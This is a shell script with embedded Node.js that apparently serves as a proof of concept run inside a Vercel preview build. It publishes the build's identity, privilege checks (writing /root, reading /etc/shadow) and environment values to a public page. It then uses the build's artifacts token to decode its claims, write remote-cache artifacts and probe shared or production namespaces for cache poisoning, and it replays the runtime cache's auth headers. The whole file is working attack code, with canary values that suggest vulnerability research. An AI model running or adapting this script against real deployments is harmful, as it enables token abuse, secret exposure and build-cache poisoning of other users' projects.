#!/bin/sh
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
{
  echo "== who am i =="
  id
  uname -a
  echo "FAKEROOTKEY=${FAKEROOTKEY:-ABSENT}"
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo -n "write to /root: "
  (touch /root/.lab-write-test && echo OK) || echo DENIED
  echo -n "read /etc/shadow: "
  (head -c 1 /etc/shadow >/dev/null 2>&1 && echo READABLE) || echo DENIED
  echo "LAB-NONCE: CANARY-8336db7bc74b6183"
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "LAB_CANARY_A=${LAB_CANARY_A:-unset}"
  echo "LAB_PROD_ONLY=${LAB_PROD_ONLY:-unset}   (target=production only)"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset} TURBO_REMOTE_ONLY=${TURBO_REMOTE_ONLY:-unset}"
  echo "RUNTIME_CACHE_ENDPOINT=${RUNTIME_CACHE_ENDPOINT:-unset}"
} > public/rce.txt
node -e '
const out = [];
const tok = (n) => process.env[n] || "";
const ep = process.env.VERCEL_API_ENDPOINT || "https://api.vercel.com";
const team = process.env.VERCEL_ARTIFACTS_OWNER || "";
const AT = tok("VERCEL_ARTIFACTS_TOKEN");
const H = (extra) => Object.assign({ Authorization: "Bearer " + AT }, extra || {});
async function hit(label, method, url, opts) {
  try {
    const r = await fetch(url, Object.assign({ method }, opts || {}));
    let b = "";
    try { b = (await r.text()).slice(0, 140); } catch (e) {}
    out.push(method + " " + label + " -> HTTP " + r.status + (b ? " | " + b.replace(/\n/g, " ") : ""));
    return r.status;
  } catch (e) {
    out.push(method + " " + label + " -> ERR " + String(e.message).slice(0, 60));
    return 0;
  }
}
function jwt(t) {
  try { return JSON.parse(Buffer.from(t.split(".")[1], "base64").toString("utf8")); }
  catch (e) { return null; }
}
(async () => {
  out.push("== artifacts token: what does it actually grant ==");
  const j = jwt(AT);
  if (j) {
    for (const k of Object.keys(j).sort()) {
      let v = String(j[k]);
      if (v.length > 120) v = v.slice(0, 120) + "...";
      out.push("  " + k + " = " + v);
    }
  } else { out.push("  (not a JWT, len " + AT.length + ")"); }
  const nonce = "lab-" + Math.random().toString(36).slice(2, 10);
  out.push("== write test: artifact hash " + nonce + " (team " + team + ") ==");
  await hit("v8/artifacts/" + nonce + "?teamId=" + team, "HEAD",
    ep + "/v8/artifacts/" + nonce + "?teamId=" + team, { headers: H() });
  await hit("v8/artifacts/" + nonce + "?teamId=" + team, "GET",
    ep + "/v8/artifacts/" + nonce + "?teamId=" + team, { headers: H() });
  await hit("v8/artifacts/" + nonce + "?teamId=" + team, "PUT",
    ep + "/v8/artifacts/" + nonce + "?teamId=" + team,
    { headers: H({ "Content-Type": "application/octet-stream" }),
      body: Buffer.from("LAB-ARTIFACT-CANARY-8336db7bc74b6183") });
  await hit("v8/artifacts/" + nonce + "?teamId=" + team, "GET",
    ep + "/v8/artifacts/" + nonce + "?teamId=" + team, { headers: H() });
  out.push("== can a fork build write into the SHARED namespace? ==");
  for (const ns of ["repo", "shared", "repository", "default", "production"]) {
    await hit("v8/artifacts/" + nonce + "?teamId=" + team + "&namespace=" + ns, "PUT",
      ep + "/v8/artifacts/" + nonce + "?teamId=" + team + "&namespace=" + ns,
      { headers: H({ "Content-Type": "application/octet-stream" }),
        body: Buffer.from("LAB-NAMESPACE-PROBE") });
  }
  out.push("== runtime (suspense) cache ==");
  const sce = process.env.RUNTIME_CACHE_ENDPOINT || "";
  const raw = tok("RUNTIME_CACHE_HEADERS");
  let parsed = null;
  try { parsed = JSON.parse(raw); } catch (e) {}
  if (parsed && typeof parsed === "object") {
    for (const k of Object.keys(parsed)) {
      const v = String(parsed[k]);
      out.push("  header " + k + " len=" + v.length + " sha256=" +
        require("crypto").createHash("sha256").update(v).digest("hex").slice(0, 16));
    }
  } else { out.push("  RUNTIME_CACHE_HEADERS len=" + raw.length + " (not JSON)"); }
  if (sce) {
    let hdrs = {};
    try { hdrs = parsed || {}; } catch (e) {}
    await hit("suspense-cache (GET, no auth)", "GET", sce, {});
    await hit("suspense-cache (GET, its own headers)", "GET", sce, { headers: hdrs });
    await hit("suspense-cache (PUT, its own headers)", "PUT", sce + "lab-key-" + nonce,
      { headers: Object.assign({ "Content-Type": "application/octet-stream" }, hdrs),
        body: Buffer.from("LAB-SUSPENSE-CANARY") });
  }
  require("fs").appendFileSync("public/rce.txt", "\n" + out.join("\n") + "\n");
})();
' 2>> public/rce.txt
sleep 8
cat public/rce.txt
